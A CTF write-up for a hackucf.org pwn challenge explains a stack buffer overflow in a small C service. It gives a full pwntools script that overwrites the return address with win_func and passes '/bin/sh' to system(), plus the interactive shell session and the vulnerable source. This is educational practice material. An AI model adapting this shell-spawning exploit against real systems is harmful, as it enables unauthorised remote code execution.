We are given a binary, and running the application gives us the following output after entering aaaa

```language-bash
------Test Your Memory!-------

8bGyUdjA5Z
I know that mine is fine...see? : 0x8048980
Let's see how good your memory is...

>aaa
sorry, your memory sucks
```
So straight away it seems like we are given two memory addressed and we have to use them some how. We are given the c-code below as well.

Taking a look at the c-code (also given at the bottom), we see a global variable `hint` and that the memory address is being leaked with `printf("%p \n", hint);`

and that the that the outputted `8bGyUdjA5Z` is a randomly generated canary. Our input is checked against the canary here as well..

**BUT there is no need to check the canary**
Doesn't matter anyways. Easy to add to the code but it doesn't matter, and in a timed ctf you shouldn't add it. So after trial in error I found the buffer size to fill the stack up to the return address to be 23. 
|Note: 23 is also the amount of characters in "God Bless Le Memezzzzzz"       

So we fill the buffer pass the return address, and then pass the const char "bin/sh" defined as a global 

```language-c
if(strncmp(buff, p, sizeof(p)) != 0) {
	puts("sorry, your memory sucks\n");
}else {
	puts("good job!!\n");
}
```

# Exploit
So the exploit steps are
1. Grab the canary
2. Grab the address of the hint so we can go to the win function right bellow
    - ```lanauge-c
    const char* hint = "/bin/sh";
    void mem_test(char* p) {
    ```
3. Find buffersize to overwrite the return address
    - found to be 23
4. Send payload "God Bless Le Memezzzzzz" + address of Win_func + address of hint*2. 
5. Note that the file is 32bit so `p32()` to wrap the addresses
6. Now you have a shell, rejoice. Cat some flags or something cool


# Running Exploit

```language-bash
kettle   master  ⋯  Pwn  75_memory_test  
 λ  python exploit.py 
[*] '/home/kettle/git_repos/ctf/ctf.hackucf.org/Pwn/75_memory_test/mem_test'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
    RPATH:    '/usr/local/lib:$ORIGIN'
[+] Opening connection to ctf.hackucf.org on port 9004: Done

------Test Your Memory!-------

7pXXnoYKbu
I know that mine is fine...see? : 0x8048980 

Let's see how good your memory is...
> God_Bless_Le_Memezzzzzzf\x88\x0\x80\x89\x0\x80\x89\x0
sorry, your memory sucks

[*] Switching to interactive mode
$ ls
flag.txt
mem_test
$ cat fla
cat: fla: No such file or directory
$ cat flag.txt
flag{i_forgot_the_flag}
$  

```

# Pwn Code
```language-python
from pwn import *

#context.log_level =False
local   = False
binary  = ELF('mem_test')

if local:
    conn = remote('localhost', 1234)
else:
    conn = remote('ctf.hackucf.org', 9004)

def getCanary():
    print conn.recvuntil("------Test Your Memory!-------" )
    conn.recvline() + conn.recvline()
    canary = conn.recvline()
    canary = canary.strip()
    canary = canary.strip('\n')
    print canary
    return str(canary)

def getMemAddress():
    #The output is :I know that mine is fine...see? : 0x8048980
    line = conn.recvline()
    print line
    memAddress = line.split(": ")[1]
    conn.recvuntil("> ")
    memAddress = p32(int(memAddress.strip(), 16))
    return memAddress

def makePayload(canary, memAddress):
    bufferFiller    = 23                # The amount of space we need to fill up
    returnAddress   = p32(0x8048866)    # Address of win_func
    hint            = p32(0x8048980)    # /bin/sh
    filler  = "God_Bless_Le_Memezzzzzz"
    assert len(filler) <= bufferFiller  # make sure meme is right length

    payload         = filler
    payload         += returnAddress
    payload         += hint*2           # since it pushes ebp+0x
    print "> " + payload
    return payload

def sendPayload(payload):
    conn.sendline(payload)
    conn.interactive()

if __name__ == "__main__":
    canary = getCanary()
    memAddress= getMemAddress()
    payload = makePayload(canary, memAddress)
    sendPayload(payload)
```


## c code

```language-c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "pwnable_harness.h"

const char* hint = "/bin/sh";

void mem_test(char* p) {
	char buff[11];
	memset(buff, '\0', sizeof(buff));
	printf("\nI know that mine is fine...see? : ");
	printf("%p \n", hint);
	puts("Let's see how good your memory is...\n");
	printf("> ");
	scanf("%s", buff);

	if(strncmp(buff, p, sizeof(p)) != 0) {
		puts("sorry, your memory sucks\n");
	}else {
		puts("good job!!\n");
	}
}

void handle_connection(int sock) {
	int len = 10;
	char random[11];
	int i;
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";

	puts("\n\n\n------Test Your Memory!-------\n");
	srand(time(NULL));
	for(i = 0; i < len; ++i) {
		random[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}
	printf("%s", random);
	mem_test(random);
}
void win_func(char* y) {
	system(y);
}
int main(int argc, char** argv) {
	/* Defaults: Run on port 9004 for 30 seconds as user "ctf_mem_test" in a chroot */
	server_options opts = {
		.user = "ctf_mem_test",
		.chrooted = true,
		.port = 9004,
		.time_limit_seconds = 30
	};
	return server_main(argc, argv, opts, &handle_connection);
}
```
